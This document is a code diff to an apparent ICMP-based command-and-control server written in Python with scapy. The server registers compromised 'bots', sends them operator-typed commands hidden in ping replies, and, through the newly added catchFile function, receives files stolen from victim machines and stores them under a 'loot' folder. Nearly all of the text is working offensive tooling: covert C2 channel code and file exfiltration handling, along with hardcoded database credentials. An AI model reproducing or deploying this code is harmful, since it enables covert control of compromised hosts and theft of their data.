@@ -18,6 +18,38 @@ from scapy.all import *
 #def updateCommand():
 #	return command
 
+# Catch file as it comes from bot
+def catchFile(request, botId):
+	fileContents = request.split()
+       	filename = 'bot' + str(botId) + '_' + fileContents[1]
+        filename_clean = filename.replace('/','_')
+	filename_clean = 'loot/' + filename_clean
+	#print "[*] Catching file (%s) from bot: %s" % (filename_clean,botId)
+	if fileContents[0] == '(FILE_START)':
+		print "[*] File start: %s" % filename
+		file = open(filename_clean, 'w')
+		file.write('')
+	elif fileContents[0] == '(FILE_END)':
+		print "[*] File end: %s" % filename
+		file = open(filename_clean, 'a')
+		file.write('\n')
+		#file.close()
+	else:
+		file = open(filename_clean, 'a')
+		#print "[D] Writing line to file: %s" % str(fileContents[2:])
+		write_line = ' '.join(map(str,fileContents[2:]))
+		write_line = write_line + '\n'
+		file.write(write_line)
+		#print "[D] Line written: %s" % str(line)
+	file.close()
+# Response function
+def sendPingResponse(dstIP,packetId,botId,command):
+	#print "[*] Creating response for %s" % botId
+	resp = IP(dst=dstIP,id=packetId)/ICMP(type="echo-reply",id=botId)/str(command)
+        #resp.show2()
+        send(resp)
+        #print "\n[*] Response sent!"
+
 def displayBots():
 	print "[*] Displaying bots!"
 	db = MySQLdb.connect(host="localhost", # your host, usually localhost
@@ -54,7 +86,7 @@ def updateBotSysinfo(botId,remoteIP,name,os):
 	return True
 
 def doesBotExist(botId):
-	print "[*] Checking bot existence"
+	#print "[*] Checking bot existence"
         db = MySQLdb.connect(host="localhost", # your host, usually localhost
                      user="pingc2user", # your username
                      passwd="pingc2user", # your password
@@ -66,7 +98,7 @@ def doesBotExist(botId):
         #print "[D] Query: "+query
         cur.execute(query)
         if cur.fetchall():
-                print "[*] Bot ID exists"
+                #print "[*] Bot ID exists"
 		db.close()
 		return True
 	else:
@@ -113,7 +145,8 @@ def displayMenu():
 		print "1) Start C2 listener"
 	print "2) Display bots"
         print "3) Change bot command ('l' to list commands)"
-        print "4) Stop C2 listener"
+        if listener == True:
+		print "4) Stop C2 listener"
 	print "q) Quit"
 
 # Inerrupt handler to kill process cleanly
@@ -137,16 +170,15 @@ def c2main(command):
                 		request = p['Raw'].load
                         	ip_id = p['IP'].id
                        		icmp_id = p['ICMP'].id
-                       		print "[*] Request: " + request
+                       		#print "[*] Request: " + request
 				if 'What shall I do master?' in request:
-					botId = int(request[24:])
+					print "[*] Bot(%s) requesting command" % p['ICMP'].id
+					botId = int(p['ICMP'].id)
 					if doesBotExist(botId):
 						print "[*] Bot ID exists, sending command"
-                                                resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/str(command.value)
-                                                #resp.show2()
-                                                send(resp)
+                                                sendPingResponse(p['IP'].src,ip_id,icmp_id,command.value)
                                                 print "\n[*] Response sent to %s: %s" % (p['IP'].src,command.value)
-                                                print "Option: "
+						print "Option: "
                                         else:
                                         	print "[*] Client not registered"
                         	# Checkin function
@@ -157,9 +189,10 @@ def c2main(command):
                                         botId = addBot(p['IP'].src,checkinInfo[1],checkinInfo[0])
 					sendId = "id="+str(botId)
 					#print "[D] SendId: ",sendId
-					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sendId
+					sendPingResponse(p['IP'].src,ip_id,icmp_id,sendId)
+					#resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sendId
                                         #resp.show2()
-                                        send(resp)
+                                        #send(resp)
                                         print "\n[*] Response sent to %s: %s after checkin" % (p['IP'].src,command.value)
                                         print "Option: "
 				elif 'sysinfo' in request:
@@ -168,9 +201,9 @@ def c2main(command):
 					sysinfo = request[8:].split()					
 					#print "[D] Id: " + sysinfo[0]
                                 	print "\n[*] Received sysinfo from client: %s" % sysinfo
-					if doesBotExist(int(sysinfo[0])):
-						updateBotSysinfo(int(sysinfo[0]),p['IP'].src,sysinfo[2],sysinfo[1])
-                                               	print "[*] Updated sysinfo for machine(%s) from IP: %s" % (sysinfo[0],p['IP'].src)
+					if doesBotExist(int(p['ICMP'].id)):
+						updateBotSysinfo(int(p['ICMP'].id),p['IP'].src,sysinfo[1],sysinfo[0])
+                                               	print "[*] Updated sysinfo for machine(%s) from IP: %s" % (p['ICMP'].id,p['IP'].src)
 					else:
 						print "[*] Machine does not exist, ignoring"
 	
@@ -179,6 +212,13 @@ def c2main(command):
                                 	print "\n[*] Response sent: Thanks"
                                 	send(resp)
                         		print "Option: "
+				elif '(FILE' in request:
+					if doesBotExist(int(p['ICMP'].id)):
+						#print "[D] Catching file"
+						catchFile(request,int(p['ICMP'].id))
+						sendPingResponse(p['IP'].src,ip_id,icmp_id,"Thanks")
+					else:
+						print "[*] Machine does not exist, ignoring"
 				else:   
                                         print "[**] Client not recognized"
                 	except:
@@ -214,7 +254,7 @@ def main(argv):
 			print "[X] Error: " + str(e)
 		#print "[D] Option chosen: ",option
 		if option == '1':
-			command.value = 'sysinfo'
+			command.value = raw_input("Enter command: ")
 			if (len(active_children()) > 1):
 				print "[*] Capture running. Stopping first."
 				for proc in active_children():
